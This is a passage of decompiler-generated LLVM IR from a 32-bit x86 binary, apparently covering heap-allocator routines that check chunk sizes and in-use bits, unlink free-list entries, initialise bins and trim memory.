  %v3_8053277 = load i32, i32* %v2_8053277, align 4
  %v15_8053277 = icmp eq i32 %v3_8053277, %v3_8053270
  %v1_805327a = icmp eq i1 %v15_8053277, false
  br i1 %v1_805327a, label %dec_label_pc_80532b4, label %dec_label_pc_805327c

dec_label_pc_805327c:                             ; preds = %dec_label_pc_8053277
  %v2_805327c = add i32 %v2_8053264, %v1_8053253
  store i32 %v2_805327c, i32* @edi, align 4
  store i32 %v3_805326d, i32* %v2_8053270, align 4
  %v0_8053281 = load i32, i32* @esi, align 4
  %v1_8053281 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053281 = add i32 %v1_8053281, 8
  %v3_8053281 = inttoptr i32 %v2_8053281 to i32*
  store i32 %v0_8053281, i32* %v3_8053281, align 4
  %v0_805328f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053284

dec_label_pc_8053284:                             ; preds = %dec_label_pc_8053247, %dec_label_pc_805327c
  %v1_8053298 = phi i32 [ %v2_8053258, %dec_label_pc_8053247 ], [ %v0_805328f.pre, %dec_label_pc_805327c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805328c = and i32 %v3_805325b, -4
  store i32 %v1_805328c, i32* %ebp.global-to-local, align 4
  %v4_805328f = load i32, i32* %v3_80532f2, align 4
  %v15_805328f = icmp eq i32 %v1_8053298, %v4_805328f
  br i1 %v15_805328f, label %dec_label_pc_80532e5, label %dec_label_pc_8053294

dec_label_pc_8053294:                             ; preds = %dec_label_pc_8053284
  %v2_8053294 = add i32 %v1_8053298, 4
  %v3_8053294 = add i32 %v2_8053294, %v1_805328c
  %v4_8053294 = inttoptr i32 %v3_8053294 to i32*
  %v5_8053294 = load i32, i32* %v4_8053294, align 4
  store i32 %v5_8053294, i32* %eax.global-to-local, align 4
  %v3_8053298 = inttoptr i32 %v2_8053294 to i32*
  store i32 %v1_805328c, i32* %v3_8053298, align 4
  %v0_805329b = load i32, i32* %eax.global-to-local, align 4
  %v1_805329b = urem i32 %v0_805329b, 2
  %v2_805329b = icmp eq i32 %v1_805329b, 0
  store i32 %v1_805329b, i32* %eax.global-to-local, align 4
  %v1_80532a0 = icmp eq i1 %v2_805329b, false
  br i1 %v1_80532a0, label %dec_label_pc_80532c1, label %dec_label_pc_80532a2

dec_label_pc_80532a2:                             ; preds = %dec_label_pc_8053294
  %v0_80532a2 = load i32, i32* @ebx, align 4
  %v1_80532a2 = add i32 %v0_80532a2, 8
  %v2_80532a2 = inttoptr i32 %v1_80532a2 to i32*
  %v3_80532a2 = load i32, i32* %v2_80532a2, align 4
  store i32 %v3_80532a2, i32* @edx, align 4
  %v1_80532a5 = add i32 %v0_80532a2, 12
  %v2_80532a5 = inttoptr i32 %v1_80532a5 to i32*
  %v3_80532a5 = load i32, i32* %v2_80532a5, align 4
  store i32 %v3_80532a5, i32* %eax.global-to-local, align 4
  %v1_80532a8 = add i32 %v3_80532a2, 12
  %v2_80532a8 = inttoptr i32 %v1_80532a8 to i32*
  %v3_80532a8 = load i32, i32* %v2_80532a8, align 4
  store i32 %v3_80532a8, i32* @esi, align 4
  %v12_80532ab = icmp eq i32 %v3_80532a8, %v0_80532a2
  %v1_80532ad = icmp eq i1 %v12_80532ab, false
  br i1 %v1_80532ad, label %dec_label_pc_80532b4, label %dec_label_pc_80532af

dec_label_pc_80532af:                             ; preds = %dec_label_pc_80532a2
  %v1_80532af = add i32 %v3_80532a5, 8
  %v2_80532af = inttoptr i32 %v1_80532af to i32*
  %v3_80532af = load i32, i32* %v2_80532af, align 4
  %v15_80532af = icmp eq i32 %v3_80532af, %v3_80532a8
  br i1 %v15_80532af, label %dec_label_pc_80532b9, label %dec_label_pc_80532b4

dec_label_pc_80532b4:                             ; preds = %dec_label_pc_80532af, %dec_label_pc_80532a2, %dec_label_pc_8053277, %dec_label_pc_8053264
  %v0_80532b4 = call i32 @function_8053550()
  store i32 %v0_80532b4, i32* %eax.global-to-local, align 4
  %v1_80532bb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80532b9

dec_label_pc_80532b9:                             ; preds = %dec_label_pc_80532af, %dec_label_pc_80532b4
  %v1_80532bb = phi i32 [ %v3_80532a2, %dec_label_pc_80532af ], [ %v1_80532bb.pre, %dec_label_pc_80532b4 ]
  %v0_80532bb = phi i32 [ %v3_80532a5, %dec_label_pc_80532af ], [ %v0_80532b4, %dec_label_pc_80532b4 ]
  %v0_80532b9 = load i32, i32* @edi, align 4
  %v1_80532b9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80532b9 = add i32 %v1_80532b9, %v0_80532b9
  store i32 %v2_80532b9, i32* @edi, align 4
  %v2_80532bb = add i32 %v1_80532bb, 12
  %v3_80532bb = inttoptr i32 %v2_80532bb to i32*
  store i32 %v0_80532bb, i32* %v3_80532bb, align 4
  %v0_80532be = load i32, i32* @edx, align 4
  %v1_80532be = load i32, i32* %eax.global-to-local, align 4
  %v2_80532be = add i32 %v1_80532be, 8
  %v3_80532be = inttoptr i32 %v2_80532be to i32*
  store i32 %v0_80532be, i32* %v3_80532be, align 4
  br label %dec_label_pc_80532c1

dec_label_pc_80532c1:                             ; preds = %dec_label_pc_8053294, %dec_label_pc_80532b9
  store i32 %v1_805320c, i32* %eax.global-to-local, align 4
  %v3_80532c5 = load i32, i32* %v2_80532c5, align 4
  store i32 %v3_80532c5, i32* @edx, align 4
  %v0_80532c8 = load i32, i32* @ecx, align 4
  store i32 %v0_80532c8, i32* %v2_80532c5, align 4
  %v0_80532cb = load i32, i32* @edi, align 4
  %v1_80532cd = or i32 %v0_80532cb, 1
  %v1_80532d0 = load i32, i32* @ecx, align 4
  %v2_80532d0 = add i32 %v1_80532d0, 4
  %v3_80532d0 = inttoptr i32 %v2_80532d0 to i32*
  store i32 %v1_80532cd, i32* %v3_80532d0, align 4
  %v0_80532d3 = load i32, i32* @ecx, align 4
  %v1_80532d3 = load i32, i32* @edx, align 4
  %v2_80532d3 = add i32 %v1_80532d3, 12
  %v3_80532d3 = inttoptr i32 %v2_80532d3 to i32*
  store i32 %v0_80532d3, i32* %v3_80532d3, align 4
  store i32 %v1_805320c, i32* %eax.global-to-local, align 4
  %v0_80532da = load i32, i32* @edx, align 4
  %v1_80532da = load i32, i32* @ecx, align 4
  %v2_80532da = add i32 %v1_80532da, 8
  %v3_80532da = inttoptr i32 %v2_80532da to i32*
  store i32 %v0_80532da, i32* %v3_80532da, align 4
  %v0_80532dd = load i32, i32* @edi, align 4
  %v1_80532dd = load i32, i32* @ecx, align 4
  %v3_80532dd = add i32 %v1_80532dd, %v0_80532dd
  %v4_80532dd = inttoptr i32 %v3_80532dd to i32*
  store i32 %v0_80532dd, i32* %v4_80532dd, align 4
  %v0_80532e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80532e0 = load i32, i32* @ecx, align 4
  %v2_80532e0 = add i32 %v1_80532e0, 12
  %v3_80532e0 = inttoptr i32 %v2_80532e0 to i32*
  store i32 %v0_80532e0, i32* %v3_80532e0, align 4
  br label %dec_label_pc_80532f5

dec_label_pc_80532e5:                             ; preds = %dec_label_pc_8053284
  %v0_80532e5 = load i32, i32* @edi, align 4
  %v2_80532e5 = add i32 %v0_80532e5, %v1_805328c
  %v1_80532e8 = or i32 %v2_80532e5, 1
  store i32 %v1_80532e8, i32* %eax.global-to-local, align 4
  %v1_80532eb = load i32, i32* @ecx, align 4
  %v2_80532eb = add i32 %v1_80532eb, 4
  %v3_80532eb = inttoptr i32 %v2_80532eb to i32*
  store i32 %v1_80532e8, i32* %v3_80532eb, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_80532f2 = load i32, i32* @ecx, align 4
  store i32 %v0_80532f2, i32* %v3_80532f2, align 4
  br label %dec_label_pc_80532f5

dec_label_pc_80532f5:                             ; preds = %dec_label_pc_80532c1, %dec_label_pc_80532e5
  store i32 %v3_8053247, i32* @ecx, align 4
  %v1_80532f9 = icmp eq i32 %v3_8053247, 0
  %v1_80532fb = icmp eq i1 %v1_80532f9, false
  br i1 %v1_80532fb, label %dec_label_pc_8053247, label %dec_label_pc_8053301

dec_label_pc_8053301:                             ; preds = %dec_label_pc_80532f5, %dec_label_pc_8053233
  store i32 %v4_805322b, i32* @ecx, align 4
  %v15_8053305 = icmp eq i32 %v0_8053241, %v4_805322b
  br i1 %v15_8053305, label %dec_label_pc_8053389, label %dec_label_pc_805330b

dec_label_pc_805330b:                             ; preds = %dec_label_pc_8053301
  %v4_805330b = add i32 %v0_8053241, 4
  br label %dec_label_pc_8053233

dec_label_pc_8053315:                             ; preds = %dec_label_pc_8053324.preheader, %dec_label_pc_8053315
  %v1_805331920 = phi i32 [ 1, %dec_label_pc_8053324.preheader ], [ %v0_8053324.pre, %dec_label_pc_8053315 ]
  %v2_8053319 = mul i32 %v1_805331920, 8
  %v4_8053319 = add i32 %v3_8053319, %v2_8053319
  store i32 %v4_8053319, i32* %eax.global-to-local, align 4
  %v1_805331d = add i32 %v1_805331920, 1
  store i32 %v1_805331d, i32* %edx.global-to-local, align 4
  %v2_805331e = add i32 %v4_8053319, 12
  %v3_805331e = inttoptr i32 %v2_805331e to i32*
  store i32 %v4_8053319, i32* %v3_805331e, align 4
  %v0_8053321 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053321 = add i32 %v0_8053321, 8
  %v3_8053321 = inttoptr i32 %v2_8053321 to i32*
  store i32 %v0_8053321, i32* %v3_8053321, align 4
  %v0_8053324.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8053327 = icmp sgt i32 %v0_8053324.pre, 95
  br i1 %v7_8053327, label %dec_label_pc_8053329, label %dec_label_pc_8053315

dec_label_pc_8053329:                             ; preds = %dec_label_pc_8053315
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805332d = add i32 %tmp11, 864
  %v2_805332d = inttoptr i32 %v1_805332d to i32*
  %v3_805332d = load i32, i32* %v2_805332d, align 4
  %v4_805332d = or i32 %v3_805332d, 1
  store i32 %v4_805332d, i32* %v2_805332d, align 4
  %v0_8053334 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053334 = add i32 %v0_8053334, 840
  %v2_8053334 = inttoptr i32 %v1_8053334 to i32*
  store i32 0, i32* %v2_8053334, align 4
  %v0_805333e = load i32, i32* %eax.global-to-local, align 4
  %v1_805333e = add i32 %v0_805333e, 852
  %v2_805333e = inttoptr i32 %v1_805333e to i32*
  store i32 65536, i32* %v2_805333e, align 4
  %v0_8053348 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053348 = add i32 %v0_8053348, 844
  %v2_8053348 = inttoptr i32 %v1_8053348 to i32*
  store i32 262144, i32* %v2_8053348, align 4
  %v0_8053352 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053352 = add i32 %v0_8053352, 836
  %v2_8053352 = inttoptr i32 %v1_8053352 to i32*
  store i32 262144, i32* %v2_8053352, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8053363 = load i32, i32* %arg1, align 4
  %v1_8053365 = urem i32 %v2_8053363, 4
  %v1_8053368 = or i32 %v1_8053365, 72
  store i32 %v1_8053368, i32* %arg1, align 4
  %v0_805336d = load i32, i32* @edx, align 4
  %v1_805336f = add i32 %v0_805336d, 52
  store i32 %v1_805336f, i32* %eax.global-to-local, align 4
  %v2_8053372 = add i32 %v0_805336d, 44
  %v3_8053372 = inttoptr i32 %v2_8053372 to i32*
  store i32 %v1_805336f, i32* %v3_8053372, align 4
  %v1_8053377 = call i32 @function_8053ed0(i32 30)
  store i32 %v1_8053377, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8053383 = add i32 %tmp11, 860
  %v3_8053383 = inttoptr i32 %v2_8053383 to i32*
  store i32 %v1_8053377, i32* %v3_8053383, align 4
  br label %dec_label_pc_8053389

dec_label_pc_8053389:                             ; preds = %dec_label_pc_8053301, %dec_label_pc_8053329
  store i32 %v0_80531ec, i32* @ebx, align 4
  store i32 %v0_80531eb, i32* @esi, align 4
  store i32 %v0_80531ea, i32* @edi, align 4
  %v0_8053390 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053390

; uselistorder directives
  uselistorder i32 %v0_8053321, { 1, 0 }
  uselistorder i32 %v0_80532dd, { 1, 0 }
  uselistorder i32 %v1_805329b, { 1, 0 }
  uselistorder i32 %v2_8053294, { 1, 0 }
  uselistorder i32 %v1_805328c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053298, { 1, 0 }
  uselistorder i32 %v3_8053247, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8053264, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053241, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80532f2, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8053389, { 1, 0 }
  uselistorder label %dec_label_pc_8053315, { 1, 0 }
  uselistorder label %dec_label_pc_80532f5, { 1, 0 }
  uselistorder label %dec_label_pc_80532c1, { 1, 0 }
  uselistorder label %dec_label_pc_80532b9, { 1, 0 }
  uselistorder label %dec_label_pc_8053284, { 1, 0 }
}

define i32 @function_8053391(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053391:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053391 = load i32, i32* @ebp, align 4
  %v0_8053392 = load i32, i32* @edi, align 4
  %v0_8053393 = load i32, i32* @esi, align 4
  %v0_8053394 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805339c = icmp eq i32 %arg1, 0
  br i1 %v1_805339c, label %dec_label_pc_8053525, label %dec_label_pc_80533a4

dec_label_pc_80533a4:                             ; preds = %dec_label_pc_8053391
  %v2_80533af = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80533af, i32* @eax, align 4
  %v2_80533b4 = call i32 @function_805405a(i32 %v2_80533af, i32 134561879)
  store i32 %v2_80533b4, i32* %eax.global-to-local, align 4
  %v1_80533c0 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e770.341 to i32))
  %v1_80533c5 = add i32 %arg1, -8
  store i32 %v1_80533c5, i32* @ecx, align 4
  %v0_80533c8 = load i8, i8* @global_var_8064be0.342, align 1
  %v1_80533c8 = sext i8 %v0_80533c8 to i32
  store i32 %v1_80533c8, i32* %eax.global-to-local, align 4
  %v1_80533cd = add i32 %arg1, -4
  %v2_80533cd = inttoptr i32 %v1_80533cd to i32*
  %v3_80533cd = load i32, i32* %v2_80533cd, align 4
  store i32 %v3_80533cd, i32* @edx, align 4
  %v1_80533d5 = and i32 %v3_80533cd, -4
  %v4_80533d5 = trunc i32 %v1_80533d5 to i8
  store i32 %v1_80533d5, i32* @ebx, align 4
  %v8_80533da = icmp ugt i8 %v4_80533d5, %v0_80533c8
  br i1 %v8_80533da, label %dec_label_pc_80533fc, label %dec_label_pc_80533dc

dec_label_pc_80533dc:                             ; preds = %dec_label_pc_80533a4
  %v1_80533dc = or i32 %v1_80533c8, 3
  %v3_80533dc = trunc i32 %v1_80533dc to i8
  store i32 %v1_80533dc, i32* %eax.global-to-local, align 4
  %v2_80533df = udiv i32 %v3_80533cd, 8
  store i8 %v3_80533dc, i8* @global_var_8064be0.342, align 32
  %v1_80533e7 = mul nuw i32 %v2_80533df, 4
  %v2_80533e7 = add i32 %v1_80533e7, ptrtoint (i8* @global_var_8064be0.342 to i32)
  store i32 %v2_80533e7, i32* @edx, align 4
  %v1_80533ee = add i32 %v1_80533e7, add (i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32 -4)
  %v2_80533ee = inttoptr i32 %v1_80533ee to i32*
  %v3_80533ee = load i32, i32* %v2_80533ee, align 4
  store i32 %v3_80533ee, i32* %eax.global-to-local, align 4
  %v3_80533f1 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80533ee, i32* %v3_80533f1, align 4
  %v0_80533f4 = load i32, i32* @ecx, align 4
  %v1_80533f4 = load i32, i32* @edx, align 4
  %v2_80533f4 = add i32 %v1_80533f4, -4
  %v3_80533f4 = inttoptr i32 %v2_80533f4 to i32*
  store i32 %v0_80533f4, i32* %v3_80533f4, align 4
  br label %dec_label_pc_8053514

dec_label_pc_80533fc:                             ; preds = %dec_label_pc_80533a4
  %v2_80533fc = and i32 %v3_80533cd, 2
  %v3_80533fc = icmp eq i32 %v2_80533fc, 0
  %v1_80533ff = icmp eq i1 %v3_80533fc, false
  br i1 %v1_80533ff, label %dec_label_pc_80534f4, label %dec_label_pc_8053405

dec_label_pc_8053405:                             ; preds = %dec_label_pc_80533fc
  %v1_8053405 = or i32 %v1_80533c8, 1
  %v3_8053405 = trunc i32 %v1_8053405 to i8
  store i32 %v1_8053405, i32* %eax.global-to-local, align 4
  store i8 %v3_8053405, i8* @global_var_8064be0.342, align 32
  %v2_805340d = add i32 %v1_80533d5, %v1_80533c5
  store i32 %v2_805340d, i32* @esi, align 4
  %v1_8053410 = add i32 %v2_805340d, 4
  %v2_8053410 = inttoptr i32 %v1_8053410 to i32*
  %v3_8053410 = load i32, i32* %v2_8053410, align 4
  store i32 %v3_8053410, i32* %eax.global-to-local, align 4
  %v2_8053417 = inttoptr i32 %v1_80533cd to i8*
  %v3_8053417 = load i8, i8* %v2_8053417, align 1
  %v4_8053417 = urem i8 %v3_8053417, 2
  %v5_8053417 = icmp eq i8 %v4_8053417, 0
  %v1_805341b = icmp eq i1 %v5_8053417, false
  br i1 %v1_805341b, label %dec_label_pc_805343e, label %dec_label_pc_805341d

dec_label_pc_805341d:                             ; preds = %dec_label_pc_8053405
  %v2_805341d = inttoptr i32 %v1_80533c5 to i32*
  %v3_805341d = load i32, i32* %v2_805341d, align 4
  store i32 %v3_805341d, i32* @ebp, align 4
  %v2_8053422 = sub i32 %v1_80533c5, %v3_805341d
  store i32 %v2_8053422, i32* %eax.global-to-local, align 4
  %v1_8053424 = add i32 %v2_8053422, 8
  %v2_8053424 = inttoptr i32 %v1_8053424 to i32*
  %v3_8053424 = load i32, i32* %v2_8053424, align 4
  store i32 %v3_8053424, i32* @edi, align 4
  %v1_8053427 = add i32 %v2_8053422, 12
  %v2_8053427 = inttoptr i32 %v1_8053427 to i32*
  %v3_8053427 = load i32, i32* %v2_8053427, align 4
  store i32 %v3_8053427, i32* @edx, align 4
  %v1_805342a = add i32 %v3_8053424, 12
  %v2_805342a = inttoptr i32 %v1_805342a to i32*
  %v3_805342a = load i32, i32* %v2_805342a, align 4
  store i32 %v3_805342a, i32* @ecx, align 4
  %v12_805342d = icmp eq i32 %v3_805342a, %v2_8053422
  %v1_805342f = icmp eq i1 %v12_805342d, false
  br i1 %v1_805342f, label %dec_label_pc_805346d, label %dec_label_pc_8053431

dec_label_pc_8053431:                             ; preds = %dec_label_pc_805341d
  %v1_8053431 = add i32 %v3_8053427, 8
  %v2_8053431 = inttoptr i32 %v1_8053431 to i32*
  %v3_8053431 = load i32, i32* %v2_8053431, align 4
  %v15_8053431 = icmp eq i32 %v3_8053431, %v3_805342a
  %v1_8053434 = icmp eq i1 %v15_8053431, false
  br i1 %v1_8053434, label %dec_label_pc_805346d, label %dec_label_pc_8053436

dec_label_pc_8053436:                             ; preds = %dec_label_pc_8053431
  %v2_8053436 = add i32 %v3_805341d, %v1_80533d5
  store i32 %v2_8053436, i32* @ebx, align 4
  store i32 %v3_8053427, i32* %v2_805342a, align 4
  %v0_805343b = load i32, i32* @edi, align 4
  %v1_805343b = load i32, i32* @edx, align 4
  %v2_805343b = add i32 %v1_805343b, 8
  %v3_805343b = inttoptr i32 %v2_805343b to i32*
  store i32 %v0_805343b, i32* %v3_805343b, align 4
  %v0_8053445.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805343e

dec_label_pc_805343e:                             ; preds = %dec_label_pc_8053405, %dec_label_pc_8053436
  %v1_8053451 = phi i32 [ %v2_805340d, %dec_label_pc_8053405 ], [ %v0_8053445.pre, %dec_label_pc_8053436 ]
  %v1_8053442 = and i32 %v3_8053410, -4
  store i32 %v1_8053442, i32* @ebp, align 4
  %v1_8053445 = load i32, i32* @global_var_8064c0c.343, align 4
  %v12_8053445 = icmp eq i32 %v1_8053451, %v1_8053445
  br i1 %v12_8053445, label %dec_label_pc_805349f, label %dec_label_pc_805344d

dec_label_pc_805344d:                             ; preds = %dec_label_pc_805343e
  %v2_805344d = add i32 %v1_8053451, 4
  %v3_805344d = add i32 %v2_805344d, %v1_8053442
  %v4_805344d = inttoptr i32 %v3_805344d to i32*
  %v5_805344d = load i32, i32* %v4_805344d, align 4
  store i32 %v5_805344d, i32* %eax.global-to-local, align 4
  %v3_8053451 = inttoptr i32 %v2_805344d to i32*
  store i32 %v1_8053442, i32* %v3_8053451, align 4
  %v0_8053454 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053454 = urem i32 %v0_8053454, 2
  %v2_8053454 = icmp eq i32 %v1_8053454, 0
  store i32 %v1_8053454, i32* %eax.global-to-local, align 4
  %v1_8053459 = icmp eq i1 %v2_8053454, false
  br i1 %v1_8053459, label %dec_label_pc_805347a, label %dec_label_pc_805345b

dec_label_pc_805345b:                             ; preds = %dec_label_pc_805344d
  %v0_805345b = load i32, i32* @esi, align 4
  %v1_805345b = add i32 %v0_805345b, 8
  %v2_805345b = inttoptr i32 %v1_805345b to i32*
  %v3_805345b = load i32, i32* %v2_805345b, align 4
  store i32 %v3_805345b, i32* @edx, align 4
  %v1_805345e = add i32 %v0_805345b, 12
  %v2_805345e = inttoptr i32 %v1_805345e to i32*
  %v3_805345e = load i32, i32* %v2_805345e, align 4
  store i32 %v3_805345e, i32* %eax.global-to-local, align 4
  %v1_8053461 = add i32 %v3_805345b, 12
  %v2_8053461 = inttoptr i32 %v1_8053461 to i32*
  %v3_8053461 = load i32, i32* %v2_8053461, align 4
  store i32 %v3_8053461, i32* @edi, align 4
  %v12_8053464 = icmp eq i32 %v3_8053461, %v0_805345b
  %v1_8053466 = icmp eq i1 %v12_8053464, false
  br i1 %v1_8053466, label %dec_label_pc_805346d, label %dec_label_pc_8053468

dec_label_pc_8053468:                             ; preds = %dec_label_pc_805345b
  %v1_8053468 = add i32 %v3_805345e, 8
  %v2_8053468 = inttoptr i32 %v1_8053468 to i32*
  %v3_8053468 = load i32, i32* %v2_8053468, align 4
  %v15_8053468 = icmp eq i32 %v3_8053468, %v3_8053461
  br i1 %v15_8053468, label %dec_label_pc_8053472, label %dec_label_pc_805346d

dec_label_pc_805346d:                             ; preds = %dec_label_pc_8053468, %dec_label_pc_805345b, %dec_label_pc_8053431, %dec_label_pc_805341d
  %v0_805346d = call i32 @function_8053550()
  store i32 %v0_805346d, i32* %eax.global-to-local, align 4
  %v1_8053472.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053472

dec_label_pc_8053472:                             ; preds = %dec_label_pc_8053468, %dec_label_pc_805346d
  %v1_8053472 = phi i32 [ %v3_805345b, %dec_label_pc_8053468 ], [ %v1_8053472.pre, %dec_label_pc_805346d ]
  %v0_8053472 = phi i32 [ %v3_805345e, %dec_label_pc_8053468 ], [ %v0_805346d, %dec_label_pc_805346d ]
  %v2_8053472 = add i32 %v1_8053472, 12
  %v3_8053472 = inttoptr i32 %v2_8053472 to i32*
  store i32 %v0_8053472, i32* %v3_8053472, align 4
  %v0_8053475 = load i32, i32* @ebx, align 4
  %v1_8053475 = load i32, i32* @ebp, align 4
  %v2_8053475 = add i32 %v1_8053475, %v0_8053475
  store i32 %v2_8053475, i32* @ebx, align 4
  %v0_8053477 = load i32, i32* @edx, align 4
  %v1_8053477 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053477 = add i32 %v1_8053477, 8
  %v3_8053477 = inttoptr i32 %v2_8053477 to i32*
  store i32 %v0_8053477, i32* %v3_8053477, align 4
  br label %dec_label_pc_805347a

dec_label_pc_805347a:                             ; preds = %dec_label_pc_805344d, %dec_label_pc_8053472
  %v0_805347a = load i32, i32* @global_var_8064c1c.361, align 4
  store i32 %v0_805347a, i32* %eax.global-to-local, align 4
  %v0_805347f = load i32, i32* @ecx, align 4
  %v1_805347f = add i32 %v0_805347f, 12
  %v2_805347f = inttoptr i32 %v1_805347f to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_805347f, align 4
  %v0_8053486 = load i32, i32* @ebx, align 4
  %v1_8053486 = load i32, i32* @ecx, align 4
  %v3_8053486 = add i32 %v1_8053486, %v0_8053486
  %v4_8053486 = inttoptr i32 %v3_8053486 to i32*
  store i32 %v0_8053486, i32* %v4_8053486, align 4
  %v0_8053489 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053489 = load i32, i32* @ecx, align 4
  %v2_8053489 = add i32 %v1_8053489, 8
  %v3_8053489 = inttoptr i32 %v2_8053489 to i32*
  store i32 %v0_8053489, i32* %v3_8053489, align 4
  %v0_805348c = load i32, i32* @ecx, align 4
  %v1_805348c = load i32, i32* %eax.global-to-local, align 4
  %v2_805348c = add i32 %v1_805348c, 12
  %v3_805348c = inttoptr i32 %v2_805348c to i32*
  store i32 %v0_805348c, i32* %v3_805348c, align 4
  %v0_805348f = load i32, i32* @ebx, align 4
  %v1_8053491 = or i32 %v0_805348f, 1
  store i32 %v1_8053491, i32* %eax.global-to-local, align 4
  %v0_8053494 = load i32, i32* @ecx, align 4
  store i32 %v0_8053494, i32* @global_var_8064c1c.361, align 4
  %v2_805349a = add i32 %v0_8053494, 4
  %v3_805349a = inttoptr i32 %v2_805349a to i32*
  store i32 %v1_8053491, i32* %v3_805349a, align 4
  br label %dec_label_pc_80534af

dec_label_pc_805349f:                             ; preds = %dec_label_pc_805343e
  %v0_805349f = load i32, i32* @ebx, align 4
  %v2_805349f = add i32 %v0_805349f, %v1_8053442
  store i32 %v2_805349f, i32* @ebx, align 4
  %v1_80534a3 = or i32 %v2_805349f, 1
  store i32 %v1_80534a3, i32* %eax.global-to-local, align 4
  %v1_80534a6 = load i32, i32* @ecx, align 4
  %v2_80534a6 = add i32 %v1_80534a6, 4
  %v3_80534a6 = inttoptr i32 %v2_80534a6 to i32*
  store i32 %v1_80534a3, i32* %v3_80534a6, align 4
  %v0_80534a9 = load i32, i32* @ecx, align 4
  store i32 %v0_80534a9, i32* @global_var_8064c0c.343, align 4
  br label %dec_label_pc_80534af

dec_label_pc_80534af:                             ; preds = %dec_label_pc_805347a, %dec_label_pc_805349f
  %v0_80534af = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80534af, 131072
  br i1 %tmp, label %dec_label_pc_8053514, label %dec_label_pc_80534b7

dec_label_pc_80534b7:                             ; preds = %dec_label_pc_80534af
  %v0_80534b7 = load i8, i8* @global_var_8064be0.342, align 32
  %v1_80534b7 = and i8 %v0_80534b7, 2
  %v2_80534b7 = icmp eq i8 %v1_80534b7, 0
  br i1 %v2_80534b7, label %dec_label_pc_80534d0, label %dec_label_pc_80534c0

dec_label_pc_80534c0:                             ; preds = %dec_label_pc_80534b7
  %v2_80534c8 = call i32 @function_80531e9(i32* bitcast (i8* @global_var_8064be0.342 to i32*))
  store i32 %v2_80534c8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80534d0

dec_label_pc_80534d0:                             ; preds = %dec_label_pc_80534b7, %dec_label_pc_80534c0
  %v0_80534d0 = load i32, i32* @global_var_8064c0c.343, align 4
  store i32 %v0_80534d0, i32* %eax.global-to-local, align 4
  %v1_80534d5 = add i32 %v0_80534d0, 4
  %v2_80534d5 = inttoptr i32 %v1_80534d5 to i32*
  %v3_80534d5 = load i32, i32* %v2_80534d5, align 4
  %v1_80534d8 = and i32 %v3_80534d5, -4
  store i32 %v1_80534d8, i32* %eax.global-to-local, align 4
  %v1_80534db = load i32, i32* @global_var_8064f24.359, align 4
  %v7_80534db = icmp ult i32 %v1_80534d8, %v1_80534db
  br i1 %v7_80534db, label %dec_label_pc_8053514, label %dec_label_pc_80534e3

dec_label_pc_80534e3:                             ; preds = %dec_label_pc_80534d0
  %v0_80534e3 = load i32, i32* @global_var_8064f28.357, align 8
  store i32 %v0_80534e3, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32* @edx, align 4
  %v0_80534ed = call i32 @function_805315c()
  store i32 %v0_80534ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053514

dec_label_pc_80534f4:                             ; preds = %dec_label_pc_80533fc
  %v2_80534f4 = inttoptr i32 %v1_80533c5 to i32*
  %v3_80534f4 = load i32, i32* %v2_80534f4, align 4
  %v0_80534f7 = load i32, i32* @global_var_8064f30.350, align 16
  %v1_80534f7 = add i32 %v0_80534f7, -1
  store i32 %v1_80534f7, i32* @global_var_8064f30.350, align 16
  %v2_80534fd = add i32 %v3_80534f4, %v1_80533d5
  store i32 %v2_80534fd, i32* %eax.global-to-local, align 4
  %v2_8053500 = sub i32 %v1_80533c5, %v3_80534f4
  %v0_8053506 = load i32, i32* @global_var_8064f44.354, align 4
  %v2_8053506 = sub i32 %v0_8053506, %v2_80534fd
  store i32 %v2_8053506, i32* @global_var_8064f44.354, align 4
  %v4_805350c = inttoptr i32 %v2_8053500 to i32*
  %v5_805350c = call i32 @function_8054514(i32* %v4_805350c, i32 %v2_80534fd, i32 %v1_80533d5, i32 %v1_80533d5)
  store i32 %v5_805350c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053514

